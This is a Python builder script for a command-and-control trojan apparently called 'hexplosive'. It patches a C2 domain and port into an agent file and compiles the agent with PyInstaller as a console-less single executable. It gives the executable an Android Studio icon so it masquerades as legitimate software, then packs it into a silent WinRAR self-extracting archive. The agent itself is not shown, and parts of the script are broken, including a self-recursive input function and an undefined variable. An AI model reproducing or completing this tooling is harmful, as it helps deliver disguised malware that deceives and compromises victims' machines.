import json
import os
import shutil
import PyInstaller.__main__
import subprocess
# from icoextract import IconExtractor, IconExtractorError
# from PIL import Image

# retrieve server config info
with open("config.json", "r") as f:
    config = json.load(f)
    
domain = config["c2Domain"]
port = config["c2Port"]

# customise agent
def input():
    while True:
        payload_type = input("Payload type (Recon/Agent):")
        if payload_type == "Agent" or payload_type == "Recon":
            break
    payload_name = input("Name your payload: ")
    ico_path = ""
    while not ico_path.endswith(".ico"):
        ico_path = input("Enter ICO file path: ")
    return payload_name, ico_path, payload_type


def generate(name,payload_type):
    
    base = "./payloads/"
    ext = ".py"
    
    # check for existing agent file name before dup
    counter = 1
    while os.path.exists(name):
        counter += 1
        payload_file = f"{base}_{name}{counter}{ext}"
    
    # agent config 
    if payload_type == "Agent":
        
        # mod with server config
        shutil.copy("hexplosive-agent.py", payload_file)
        with open(payload_file, "r", encoding="utf8") as f:
            lines = f.readlines()
            lines[102] = lines[102].replace('<placeholder.your.domain.name>', domain).replace('0000', str(port))
            lines[105] = lines[105].replace('<placeholder.your.domain.name>', domain).replace('0000', str(port))
            with open(payload_file, "w", encoding="utf8") as f:
                f.writelines(lines)
        return payload_file
    
    # recce config
    else:
        pass
    
    
def compile():
    
    # testcase
    agent_py = "./payloads/agent.py"
    payload_name = "agent"
    ico_path = "C:/Program Files/Android/Android Studio/bin/studio.ico"
    
    # # path of exe in 'C:/Program Files'
    # payload_path = os.path.dirname(ico) + "\\" + exe + ".exe"
    
    # # mod file paths before compilation
    # with open(agentpy, "r", encoding="utf8") as f:
    #     lines = f.readlines()
    #     lines[76] = lines[76].replace('<exe.name.here>', exe).replace('<payload.path.here>', payload_path)
    #     lines[120] = lines[120].replace('<payload.path.here>', payload_path)
        
    # with open(agentpy, "w", encoding="utf8") as f:
    #     f.writelines(lines)
    
    
    # compilation
    try:
        PyInstaller.__main__.run([
            agent_py,
            '--noconsole',
            '--onefile',
            '--distpath=./payloads',
            '--icon='+ ico_path
        ])
        
        # remove unused folders & spec file
        shutil.rmtree("./build", ignore_errors=True)
        shutil.rmtree("./dist", ignore_errors=True)
        os.remove(payload_name +".spec")
        
    except Exception as e:
        print("Error occured during pyinstaller compilation.")
    
    
    
def createSFX(payload_name,ico): 
    try:
        # path to WinRAR
        winrar_path = "C:/Program Files/WinRAR/WinRAR.exe"
        
        # config for SFX
#         config_content = f"""
# Setup={payload_name}.exe
# TempMode
# Silent=1
# Overwrite=1
# Update=U
#         """

#         # write SFX config to config.txt
#         with open("./config.txt", "w") as config_file:
#             config_file.write(config_content)

        # convert to SFX with icon and config
        subprocess.run([
            winrar_path,
            "a",
            "-sfx",  
            "-iicon" + ico,
            "-zconfig.txt",
            "-r",
            "-ep1",
            "payloads/" + "testing.rar",
            'payloads/'+ payload_name +'.exe'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print("Error creating SFX")



# name, ico, payload_type = input()   
# agentpy = generate(name, payload_type)
# compile(agentpy,name,ico)
# createSFX(name,ico)
compile()
createSFX("agent","C:/Program Files/Android/Android Studio/bin/studio.ico")


# exe = "android studio"
# ico_path = "C:\Program Files\Android\Android Studio\bin\studio.ico"

